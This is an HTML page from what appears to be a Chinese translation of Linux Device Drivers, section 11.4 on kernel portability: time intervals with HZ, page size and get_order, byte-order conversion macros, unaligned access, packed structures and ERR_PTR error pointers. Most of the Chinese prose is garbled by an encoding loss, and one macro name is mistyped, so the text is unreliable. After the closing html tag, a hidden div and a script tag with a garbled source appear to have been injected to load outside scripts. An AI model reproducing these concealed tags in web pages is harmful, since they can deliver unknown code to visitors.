<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>11.4.&#160;ֲ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch11.html" title="&#160;11&#160;&#160;ںе">
<link rel="prev" href="ch11s03.html" title="11.3.&#160;ӿض">
<link rel="next" href="ch11s05.html" title="11.5.&#160;">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">11.4.&#160;ֲ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch11s03.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;11&#160;&#160;ںе</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch11s05.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="OtherPortabilityIssues.sect"></a>11.4.&#160;ֲ</h2></div></div></div>
<p>, дһʱмҪס,  Linux ƽֲ̨.</p>
<p>һͨĹǻʽĳֵ. ͨʹԤ, ѱ. һгҪĿֲ. ۺʱѱֵ, ͷļԼٷں˷豸ҵʾ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TimeIntervals.sect"></a>11.4.1.&#160;ʱ</h3></div></div></div>
<p>漰ʱ, Ҫٶÿ 1000 . ܵǰ i386 ϵʵ, ÿ Linux ƽ̨ٶ.  x86 ʹ HZ ֵ(ͬĳЩ), Ǵ, û֪ں˻ᷢʲô. ۺʱʹʱ, ʹ HZ ( ÿĶʱж ) 궨ʱ. , һĳʱ,  HZ/2 ȥʱȽ. ձ, msec Ӧһֱ msec*HZ/1000.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PageSize.sect"></a>11.4.2.&#160;ҳС</h3></div></div></div>
<p>ʹڴʱ, סһڴҳ PAGE_SIZE ֽ,  4KB. ٶҳС 4KB Ӳֵһ PC ԱĴ, ෴, ֵ֧ƽ̨ʾҳС 4 KB  64 KB, ʱͬƽ̨ϵĲͬʵϲͬ. صĺ궨 PAGE_SIZE  PAGE_SHIT. ߰һַλҳŵλ.  4KB ߸ҳǰ 12 ߸.  &lt;asm/page.h&gt; ж; ûռʹ getpagesize ⺯, ҪϢ.</p>
<p>ǿһ·һ. һҪ 16 KB ݴ, Ӧָһ 2 ָ  get_free_pages. Ҫһֲ. Ľ, ˵, Ѿں˿дòҳΪ get_order:</p>
<pre class="programlisting">
#include &lt;asm/page.h&gt;
int order = get_order(16*1024);
buf = get_free_pages(GFP_KERNEL, order);
</pre>
<p>ס, get_order Ĳ 2 .</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ByteOrder.sect"></a>11.4.3.&#160;ֽ</h3></div></div></div>
<p>СĲҪֽ. PC 洢ֵֽǵֽΪ(СΪ, С), һЩ߼ƽ̨һַʽ(). κοܵʱ, ĴӦд, ںݵֽ. , ʱһҪʹõֽڽһ෴, һҪһض˳豸ͨѶ.</p>
<p>ļ &lt;asm/byteorder.h&gt; ˻ __BIG_ENDIAN  __LITTLE_ENDIAN, ֽ. ֽʱ, ܱһ #ifdef __LITTTLE_ENDIAN , һõķ. Linux ں˶һ׺궨֮ת, ڴֽҪضֽ洢ͼص֮. :</p>
<pre class="programlisting">
u32 cpu_to_le32 (u32);
u32 le32_to_cpu (u32);
</pre>
<p> 2 궨תһֵ,  CPU ʹõʲôһ޷ŵ, С, 32 λ, ת. ǲ CPU С˻Ǵ, ǲ 32-λ . ûҪԭǵĲ. ʹЩ궨ڱдֲĴ, ʹô뽨.</p>
<p>кܶƵĺ;  &lt;linux/byteorder/big_endian.h&gt;  &lt;linux/byteorder/little_endian.h&gt; мб. һ֮, ģʽѭ. be64_to_cpu תһ޷ŵ, , 64-λ ֵһڲ CPU ʾ. le16_to_cpus, ෴, зŵ, С, 16 λ. ָʱ, Ҳʹ cpu_to_le32p, ʹָһֵָת, ֵ. ʣµĿļ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="DataAlignment.sect"></a>11.4.4.&#160;ݶ</h3></div></div></div>
<p>дֲֵÿǵһδȡ -- , ζȡһ洢һ 4 ֽڱĵַ4ֵֽ. i386 ûȡ, ǲеϵ. ִܶϵһ쳣, ÿγͼݴʱ; ݴ쳣, ܴ. Ҫȡ, Ӧʹк:</p>
<pre class="programlisting">
#include &lt;asm/unaligned.h&gt;
get_unaligned(ptr);
put_unaligned(val, ptr);
</pre>
<p>Щ͵, ÿ,  1 , 2 , 4 ,  8 ֽڳ. κں˰汾ж.</p>
<p>ڶһǿƽ̨ݽṹֲ. ͬݽṹ(  C- Դļж )ڲͬƽ̨ϲͬر. ݸƽ̨ͬĹŽṹԱ.</p>
<p>Ϊ˱дԿϵƶʹõݽṹ, ӦһֱǿȻ, ϶һض뷽ʽı׼. ȻζŴ洢ĴСĵַ(, 8-byte  8 ĵַ). ΪǿȻֹԲϣķʽųԱʱ, Ӧʹ߳Աݽṹ¿ն.</p>
<p>Ϊչʾǿƶ, dataalign Դ misc-progs Ŀ¼з, һԵȵ kdataalign ģ misc-modules һ. ǳڼƽ̨ϵԼģ SPARC64 :</p>
<pre class="screen">
arch Align: char short int long ptr long-long u8 u16 u32 u64
i386        1    2     4   4    4   4         1  2   4   4
i686        1    2     4   4    4   4         1  2   4   4
alpha       1    2     4   8    8   8         1  2   4   8
armv4l      1    2     4   4    4   4         1  2   4   4
ia64        1    2     4   8    8   8         1  2   4   8
mips        1    2     4   4    4   8         1  2   4   8
ppc         1    2     4   4    4   8         1  2   4   8
sparc       1    2     4   4    4   8         1  2   4   8
sparc64     1    2     4   4    4   8         1  2   4   8
x86_64      1    2     4   8    8   8         1  2   4   8

kernel: arch Align: char short int long ptr long-long u8 u16 u32 u64
kernel: sparc64     1    2     4   8    8   8         1  2   4   8
</pre>
<p>Ȥעⲻеƽ̨ 64-λֵ 64-λ߽, Ҫ߳Աǿƶͱֲ֤.</p>
<p>, Ҫ֪Լĵز䵽ṹ֤ÿԱǶ, ΪĿ괦. 㶨һṹƥһ豸Ľṹ, Զܷͼ. ķǸ߱ṹ"յ", . , ںͷļ &lt;linux/edd.h&gt; 弸 x86 BIOS ӿڵݽṹ, еĶ:</p>
<pre class="programlisting">
struct
{
        u16 id;
        u64 lun;
        u16 reserved1;
        u32 reserved2;
}
__attribute__ ((packed)) scsi;
</pre>
<p>û __attribute__ ((packed)), lun Աܱǰ 2 ֽڻ 6 ,  64-λƽ̨ϱṹ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="PointersandErrorValues.sect"></a>11.4.5.&#160;ָʹֵ</h3></div></div></div>
<p>ܶڲں˺һֵָ. ЩҲʧ. 󲿷, ʧɷһ NULL ֵָָʾ. õ, ֪ͨȷ. һЩӿȷʵҪһʵʵĴԱڵܹʵʲôȷж.</p>
<p>ں˽ӿֵָͨжԴֵϢ. ϢСʹ, Ϊǵķֵܼ򵥵 NULL Ƚ. Ϊʹӿ, һСֺѿ(  &lt;linux/err.h&gt;).</p>
<p>һָ͵ĺԷһֵ, ʹ:</p>
<pre class="programlisting">
void *ERR_PTR(long error);
</pre>
<p>, error ǳĸֵ. ߿ʹ IS_ERR Ƿһصָǲһ:</p>
<pre class="programlisting">
long IS_ERR(const void *ptr); 
</pre>
<p>ҪʵʵĴ, ܱȡ, ʹ:</p>
<pre class="programlisting">
long PTR_ERR(const void *ptr); 
</pre>
<p>Ӧֻ IS_ERR һֵֵʹ PTR_ERR; κֵһЧָ.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch11s03.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch11.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch11s05.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">11.3.&#160;ӿض&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;11.5.&#160;</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>